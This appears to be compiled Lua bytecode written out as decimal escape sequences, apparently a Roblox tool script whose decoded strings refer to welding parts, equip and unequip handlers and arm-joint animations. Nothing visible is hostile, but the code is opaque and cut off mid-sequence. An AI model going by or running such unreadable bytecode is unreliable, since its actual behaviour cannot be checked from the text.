0\0\0\22\0\1\128\68\0\0\0\132\0\0\0\148\0\0\1\140\128\64\1\73\0\0\1\30\0\128\0\3\0\0\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\66\97\115\101\80\97\114\116\0\3\0\0\0\0\0\0\240\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\211\10\0\0\224\10\0\0\0\2\0\9\26\0\0\0\133\0\0\0\197\64\0\0\0\1\128\0\220\128\0\1\87\128\192\1\22\0\0\128\194\64\0\0\194\0\128\0\1\193\0\0\156\64\128\1\133\0\1\0\192\0\128\0\3\1\0\2\22\192\1\128\197\65\0\0\0\2\128\2\220\129\0\1\23\64\193\3\22\64\0\128\137\1\0\131\22\0\0\128\9\128\129\2\161\128\0\0\22\64\253\127\30\0\0\1\30\0\128\0\7\0\0\0\4\7\0\0\0\97\115\115\101\114\116\0\4\5\0\0\0\116\121\112\101\0\4\6\0\0\0\116\97\98\108\101\0\4\22\0\0\0\86\97\108\117\101\115\32\105\115\32\110\111\116\32\97\32\116\97\98\108\101\0\4\5\0\0\0\110\101\120\116\0\4\7\0\0\0\110\117\109\98\101\114\0\4\7\0\0\0\80\97\114\101\110\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\226\10\0\0\230\10\0\0\1\2\0\5\9\0\0\0\132\0\0\0\197\0\0\0\198\64\192\1\0\1\0\0\220\128\0\1\0\1\128\0\157\0\128\1\158\0\0\0\30\0\128\0\2\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\235\10\0\0\245\10\0\0\2\1\0\12\21\0\0\0\69\0\0\0\132\0\0\0\92\0\1\1\22\192\2\128\133\1\0\0\196\1\128\0\156\1\1\1\22\64\1\128\198\66\1\0\198\66\192\5\23\128\130\5\22\64\0\128\194\2\128\0\222\2\0\1\161\129\0\0\22\192\253\127\97\128\0\0\22\64\252\127\66\0\0\0\94\0\0\1\30\0\128\0\2\0\0\0\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\78\97\109\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\247\10\0\0\18\11\0\0\3\1\0\10\44\0\0\0\68\0\0\0\90\0\0\0\22\64\0\128\66\0\0\0\94\0\0\1\68\0\128\0\128\0\0\0\92\128\0\1\90\0\0\0\22\64\0\128\66\0\0\0\94\0\0\1\75\0\64\0\92\128\0\1\148\0\128\0\23\64\64\1\22\64\0\128\130\0\0\0\158\0\0\1\133\128\0\0\192\0\128\0\156\0\1\1\22\192\3\128\196\1\128\0\0\2\0\3\220\129\0\1\218\1\0\0\22\128\0\128\194\1\0\0\222\1\0\1\22\192\1\128\203\193\64\3\68\2\0\1\70\2\193\4\220\129\128\1\218\65\0\0\22\64\0\128\194\1\0\0\222\1\0\1\161\128\0\0\22\64\251\127\130\0\128\0\158\0\0\1\30\0\128\0\5\0\0\0\4\18\0\0\0\71\101\116\67\111\110\110\101\99\116\101\100\80\97\114\116\115\0\3\0\0\0\0\0\0\240\63\4\6\0\0\0\112\97\105\114\115\0\4\15\0\0\0\73\115\68\101\115\99\101\110\100\97\110\116\79\102\0\4\7\0\0\0\80\97\114\101\110\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\11\0\0\51\11\0\0\2\4\0\12\51\0\0\0\154\64\0\0\22\0\0\128\129\0\0\0\11\65\192\0\129\129\0\0\28\129\128\1\75\65\192\0\193\193\0\0\92\129\128\1\90\65\0\0\22\192\0\128\69\1\1\0\70\65\193\2\128\1\0\1\92\129\0\1\132\1\0\0\192\1\128\2\10\130\1\0\9\194\64\131\9\2\128\131\9\66\0\132\69\130\2\0\70\66\193\4\92\130\128\0\9\66\130\132\26\1\0\0\22\128\0\128\70\2\67\2\90\66\0\0\22\192\0\128\70\130\194\0\75\66\195\4\198\130\66\0\92\130\128\1\9\66\130\133\9\66\0\135\156\65\128\1\26\65\0\0\22\64\2\128\132\1\128\0\193\193\3\0\10\2\1\0\9\66\0\135\9\130\64\131\9\66\68\136\70\194\194\2\9\66\2\134\156\129\128\1\0\1\0\3\94\1\0\1\30\0\128\0\18\0\0\0\4\5\0\0\0\87\101\108\100\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\25\0\0\0\113\82\101\108\97\116\105\118\101\67\70\114\97\109\101\87\101\108\100\86\97\108\117\101\0\4\18\0\0\0\113\67\70\114\97\109\101\87\101\108\100\84\104\105\110\103\121\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\78\97\109\101\0\4\6\0\0\0\80\97\114\116\48\0\4\6\0\0\0\80\97\114\116\49\0\4\3\0\0\0\67\48\0\4\7\0\0\0\67\70\114\97\109\101\0\4\3\0\0\0\67\49\0\4\6\0\0\0\86\97\108\117\101\0\4\14\0\0\0\116\111\79\98\106\101\99\116\83\112\97\99\101\0\4\7\0\0\0\80\97\114\101\110\116\0\4\12\0\0\0\67\70\114\97\109\101\86\97\108\117\101\0\4\11\0\0\0\65\114\99\104\105\118\97\98\108\101\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\53\11\0\0\77\11\0\0\2\4\0\14\38\0\0\0\5\1\0\0\64\1\0\0\28\1\1\1\22\128\1\128\68\2\0\0\128\2\0\4\92\130\0\1\90\2\0\0\22\64\0\128\75\66\64\4\92\66\0\1\33\129\0\0\22\128\253\127\5\1\0\0\64\1\0\0\28\1\1\1\22\192\1\128\87\64\0\4\22\64\1\128\68\2\128\0\128\2\128\0\192\2\0\4\0\3\0\1\64\3\128\0\92\66\128\2\33\129\0\0\22\64\253\127\218\64\0\0\22\192\1\128\5\1\0\0\64\1\0\0\28\1\1\1\22\0\0\128\9\194\64\129\33\129\0\0\22\0\255\127\73\192\64\129\30\0\128\0\4\0\0\0\4\6\0\0\0\112\97\105\114\115\0\4\12\0\0\0\66\114\101\97\107\74\111\105\110\116\115\0\4\9\0\0\0\65\110\99\104\111\114\101\100\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\79\11\0\0\92\11\0\0\4\0\0\8\51\0\0\0\4\0\0\0\68\0\128\0\129\0\0\0\28\128\128\1\68\0\0\1\132\0\128\0\134\64\64\1\92\128\0\1\26\0\0\0\22\64\3\128\139\128\64\0\1\193\0\0\156\128\128\1\154\0\0\0\22\0\2\128\134\192\64\0\139\0\65\1\1\65\1\0\156\128\128\1\154\0\0\0\22\128\0\128\134\192\64\0\154\64\0\0\22\0\3\128\132\0\128\0\134\64\64\1\139\0\65\1\1\129\1\0\156\128\128\1\154\0\0\0\22\0\1\128\132\0\128\0\134\64\64\1\134\192\65\1\154\64\0\0\22\0\0\128\134\0\194\0\154\0\0\0\22\128\1\128\196\0\128\1\0\1\128\0\64\1\0\1\129\65\2\0\194\1\0\0\220\64\128\2\22\128\0\128\197\128\2\0\1\193\2\0\220\64\0\1\30\0\0\1\30\0\128\0\12\0\0\0\4\5\0\0\0\84\111\111\108\0\4\7\0\0\0\80\97\114\101\110\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\7\0\0\0\72\97\110\100\108\101\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\66\97\115\101\80\97\114\116\0\4\6\0\0\0\77\111\100\101\108\0\4\12\0\0\0\80\114\105\109\97\114\121\80\97\114\116\0\3\0\0\0\0\0\0\240\63\4\5\0\0\0\87\101\108\100\0\4\5\0\0\0\119\97\114\110\0\4\28\0\0\0\113\87\101\108\100\32\45\32\85\110\97\98\108\101\32\116\111\32\119\101\108\100\32\112\97\114\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\100\11\0\0\102\11\0\0\1\0\0\2\3\0\0\0\4\0\0\0\28\64\128\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\110\11\0\0\9\12\0\0\1\0\0\18\53\0\0\0\138\0\0\0\196\0\0\0\198\0\192\1\3\1\0\2\69\65\0\0\70\129\192\2\129\193\0\0\193\1\1\0\1\194\0\0\65\66\1\0\129\194\0\0\193\194\0\0\1\195\0\0\65\195\0\0\129\3\1\0\193\195\0\0\1\4\1\0\65\196\0\0\92\129\128\6\164\1\0\0\0\0\0\0\0\0\128\1\0\0\128\0\0\0\0\2\0\0\0\1\0\0\128\2\135\129\1\0\164\65\0\0\0\0\0\0\0\0\128\0\0\0\0\2\0\0\128\2\0\0\0\1\135\193\1\0\134\1\194\1\139\65\66\3\5\130\1\0\156\65\128\1\134\129\194\1\139\65\66\3\5\194\1\0\156\65\128\1\164\129\0\0\0\0\0\0\0\0\128\1\0\0\0\1\135\193\2\0\134\1\195\1\134\65\67\3\139\65\66\3\5\194\2\0\156\65\128\1\30\0\128\0\14\0\0\0\4\7\0\0\0\80\97\114\101\110\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\0\240\63\3\0\0\0\0\0\0\240\191\4\6\0\0\0\69\113\117\105\112\0\4\8\0\0\0\85\110\101\113\117\105\112\0\4\9\0\0\0\69\113\117\105\112\112\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\11\0\0\0\85\110\101\113\117\105\112\112\101\100\0\4\8\0\0\0\65\110\105\109\97\116\101\0\4\13\0\0\0\65\110\105\109\97\116\101\86\97\108\117\101\0\4\8\0\0\0\67\104\97\110\103\101\100\0\3\0\0\0\0\0\0\0\118\11\0\0\162\11\0\0\6\1\0\11\146\0\0\0\69\0\0\0\129\64\0\0\92\64\0\1\74\0\128\0\132\0\128\0\134\128\64\1\139\192\64\1\1\1\1\0\156\128\128\1\196\0\128\0\198\128\192\1\203\192\192\1\65\65\1\0\220\0\128\1\98\64\0\0\72\0\0\0\68\0\128\0\70\128\192\0\75\192\192\0\193\192\1\0\92\128\128\1\71\128\1\0\68\0\128\0\70\128\192\0\75\192\192\0\193\0\2\0\92\128\128\1\72\0\0\1\68\0\128\1\23\64\194\0\22\128\1\128\68\0\128\0\70\128\192\0\75\192\192\0\193\0\2\0\92\128\128\1\70\128\194\0\72\0\128\1\68\0\0\0\87\64\194\0\22\0\25\128\68\0\0\1\87\64\194\0\22\64\24\128\74\0\128\0\132\0\0\1\139\192\64\1\1\193\2\0\156\128\128\1\196\0\0\1\203\192\192\1\65\1\3\0\220\0\128\1\98\64\0\0\87\64\194\0\22\64\20\128\130\0\128\0\154\0\0\0\22\64\21\128\130\0\0\0\198\64\195\0\201\64\66\135\198\192\195\0\201\64\66\135\197\0\4\0\198\64\196\1\1\129\4\0\220\128\0\1\5\129\1\0\201\0\129\137\5\129\1\0\201\0\1\129\4\1\0\0\6\65\67\2\201\0\1\135\4\1\0\2\9\193\128\134\5\1\4\0\6\65\68\2\65\129\4\0\28\129\0\1\69\129\1\0\9\65\129\137\69\129\1\0\9\65\1\129\68\1\0\0\70\193\195\2\9\65\1\135\68\1\0\2\73\1\129\135\69\65\5\0\70\65\196\2\129\65\3\0\193\129\5\0\1\194\5\0\92\129\0\2\133\65\5\0\134\1\70\3\197\65\6\0\198\129\198\3\1\194\6\0\220\129\0\1\1\2\7\0\69\66\6\0\70\130\198\4\129\66\7\0\92\2\0\1\156\129\0\0\78\129\129\2\201\64\1\138\69\65\5\0\70\65\196\2\129\129\7\0\193\129\5\0\1\130\7\0\92\129\0\2\133\65\5\0\134\1\70\3\197\65\6\0\198\129\198\3\1\66\7\0\220\129\0\1\5\66\6\0\6\130\70\4\65\194\7\0\28\130\0\1\65\2\7\0\156\129\0\2\78\129\129\2\9\65\1\138\70\1\72\0\75\65\200\2\228\1\0\0\0\0\0\0\4\0\128\1\4\0\128\2\92\65\128\1\22\128\1\128\133\128\8\0\193\192\8\0\156\64\0\1\22\128\0\128\69\128\8\0\129\0\9\0\92\64\0\1\30\0\128\0\37\0\0\0\4\5\0\0\0\119\97\105\116\0\3\123\20\174\71\225\122\132\63\4\7\0\0\0\80\97\114\101\110\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\9\0\0\0\76\101\102\116\32\65\114\109\0\4\10\0\0\0\82\105\103\104\116\32\65\114\109\0\4\5\0\0\0\104\101\97\100\0\4\5\0\0\0\72\101\97\100\0\4\6\0\0\0\84\111\114\115\111\0\0\4\5\0\0\0\78\101\99\107\0\4\14\0\0\0\76\101\102\116\32\83\104\111\117\108\100\101\114\0\4\15\0\0\0\82\105\103\104\116\32\83\104\111\117\108\100\101\114\0\3\0\0\0\0\0\0\240\63\4\6\0\0\0\80\97\114\116\49\0\3\0\0\0\0\0\0\0\64\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\87\101\108\100\0\4\6\0\0\0\80\97\114\116\48\0\4\3\0\0\0\67\49\0\4\7\0\0\0\67\70\114\97\109\101\0\3\154\153\153\153\153\153\233\63\3\205\204\204\204\204\204\236\63\4\19\0\0\0\102\114\111\109\69\117\108\101\114\65\110\103\108\101\115\88\89\90\0\4\5\0\0\0\109\97\116\104\0\4\4\0\0\0\114\97\100\0\3\0\0\0\0\0\32\114\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\128\86\192\3\0\0\0\0\0\0\240\191\3\0\0\0\0\0\0\46\192\4\5\0\0\0\77\111\118\101\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\6\0\0\0\112\114\105\110\116\0\4\3\0\0\0\115\104\0\4\5\0\0\0\97\114\109\115\0\1\0\0\0\0\0\0\0\147\11\0\0\155\11\0\0\3\0\0\10\30\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\69\128\0\0\70\192\192\0\70\0\193\0\134\0\65\0\77\128\128\0\133\128\0\0\134\192\64\1\141\0\0\1\134\64\65\1\197\128\1\0\198\192\193\1\15\129\128\0\220\128\0\1\4\1\128\0\68\1\0\1\133\65\2\0\134\129\66\3\192\1\128\1\1\194\2\0\65\194\2\0\156\129\0\2\78\129\129\2\9\65\1\132\5\1\3\0\65\65\3\0\28\65\0\1\30\0\128\0\14\0\0\0\4\4\0\0\0\72\105\116\0\4\2\0\0\0\112\0\4\5\0\0\0\104\101\97\100\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\2\0\0\0\89\0\4\10\0\0\0\109\97\103\110\105\116\117\100\101\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\97\115\105\110\0\4\3\0\0\0\67\48\0\4\7\0\0\0\67\70\114\97\109\101\0\4\19\0\0\0\102\114\111\109\69\117\108\101\114\65\110\103\108\101\115\88\89\90\0\3\0\0\0\0\0\0\0\0\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\185\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\164\11\0\0\184\11\0\0\5\1\0\6\48\0\0\0\68\0\0\0\87\0\192\0\22\0\10\128\68\0\128\0\87\0\192\0\22\64\9\128\74\0\128\0\132\0\128\0\139\64\64\1\1\129\0\0\156\128\128\1\196\0\128\0\203\64\192\1\65\193\0\0\220\0\128\1\98\64\0\0\87\0\192\0\22\64\5\128\130\0\128\0\154\0\0\0\22\64\6\128\130\0\0\0\196\0\0\1\4\1\128\1\201\0\1\130\198\64\193\0\4\1\0\0\6\65\65\2\201\0\1\131\198\192\193\0\4\1\0\0\6\193\65\2\201\0\1\131\196\0\0\2\198\64\193\1\201\0\64\132\196\0\0\2\198\192\193\1\201\0\64\132\22\128\1\128\133\64\2\0\193\128\2\0\156\64\0\1\22\128\0\128\69\64\2\0\129\192\2\0\92\64\0\1\30\0\128\0\12\0\0\0\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\14\0\0\0\76\101\102\116\32\83\104\111\117\108\100\101\114\0\4\15\0\0\0\82\105\103\104\116\32\83\104\111\117\108\100\101\114\0\4\3\0\0\0\67\48\0\3\0\0\0\0\0\0\240\63\4\6\0\0\0\80\97\114\116\49\0\3\0\0\0\0\0\0\0\64\4\7\0\0\0\80\97\114\101\110\116\0\4\6\0\0\0\112\114\105\110\116\0\4\3\0\0\0\115\104\0\4\5\0\0\0\97\114\109\115\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\188\11\0\0\5\12\0\0\3\0\0\8\167\3\0\0\10\0\128\0\68\0\128\0\70\0\192\0\75\64\192\0\193\128\0\0\92\128\128\1\132\0\128\0\134\0\64\1\139\64\64\1\1\193\0\0\156\0\128\1\34\64\0\0\8\0\0\0\4\0\128\0\6\0\65\0\6\64\65\0\23\128\65\0\22\0\76\128\4\0\0\1\6\192\65\0\68\0\0\1\70\0\194\0\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\129\4\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\193\4\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\5\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\1\6\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\193\4\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\5\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\65\6\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\129\6\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\5\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\6\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\7\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\5\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\65\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\129\7\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\5\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\8\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\5\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\129\4\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\193\4\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\132\0\128\0\134\0\65\1\137\64\200\130\4\0\128\0\6\0\65\0\6\64\65\0\23\128\72\0\22\64\151\128\4\0\0\1\6\192\65\0\68\0\0\1\70\0\194\0\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\129\4\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\193\4\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\193\4\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\129\6\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\9\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\9\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\7\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\7\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\129\7\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\129\9\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\8\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\65\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\193\9\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\8\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\193\1\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\1\10\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\8\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\65\10\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\129\10\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\8\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\193\10\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\1\11\0\133\193\3\0\134\1\68\3\193\193\4\